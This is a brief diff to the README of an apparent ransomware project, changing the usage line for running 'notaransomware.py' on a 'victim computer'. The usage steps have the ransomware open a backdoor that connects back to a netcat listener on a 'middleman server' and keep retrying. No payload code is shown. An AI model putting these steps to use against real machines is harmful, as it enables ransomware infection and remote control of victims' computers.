@@ -133,7 +133,7 @@ This will instruct netcat to listen (`-l`), output verbosely (`-v`), idk (`-n`),
 
 You will use this netcat session once the ransomware opens a backdoor for us.
 
-- Next, on your victim computer, run the ransomware with the command `python notaransomware.py <ip>` where ip is th ipv4 address of your middleman server.
+- Next, on your victim computer, run the ransomware with the command `python notaransomware.py [-m <ip>]` where ip is th ipv4 address of your middleman server.
 
 The script immediately try connecting to the middleman server, if it fails to connect, it will retry and retry again.
 
